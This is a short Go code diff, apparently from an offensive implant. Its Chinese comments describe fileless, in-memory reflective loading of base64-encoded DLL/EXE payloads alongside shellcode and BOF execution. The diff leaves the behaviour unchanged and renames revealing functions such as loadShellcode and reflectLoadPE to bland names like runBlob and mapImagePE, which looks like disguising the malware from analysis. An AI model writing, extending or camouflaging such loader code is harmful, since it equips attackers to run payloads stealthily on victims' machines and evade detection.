@@ -16,7 +16,7 @@ import (
 //
 // 目标：接收 base64 编码的 DLL/EXE 二进制后，不经过任何磁盘写入（不落盘、不走
 // LoadLibrary(路径)），直接在内存中完成映射、基址重定位与导入表解析，然后调用入口点。
-// 与 loadShellcode（VirtualAlloc + CreateThread）、loadBOF（内存 COFF 执行）共同构成
+// 与 runBlob（VirtualAlloc + CreateThread）、loadBOF（内存 COFF 执行）共同构成
 // shellcode / BOF / DLL 三类载荷的无文件执行能力。
 
 const (
@@ -55,7 +55,7 @@ func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 	if err != nil {
 		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
 	}
-	base, info, err := reflectLoadPE(raw)
+	base, info, err := mapImagePE(raw)
 	if err != nil {
 		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
 	}
@@ -75,7 +75,7 @@ func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 	return fmt.Sprintf("DLL reflectively loaded at 0x%x (%d bytes)", base, len(raw)), 0, ""
 }
 
-func reflectLoadPE(raw []byte) (uintptr, *memPE, error) {
+func mapImagePE(raw []byte) (uintptr, *memPE, error) {
 	info, err := parseMemPE(raw)
 	if err != nil {
 		return 0, nil, err
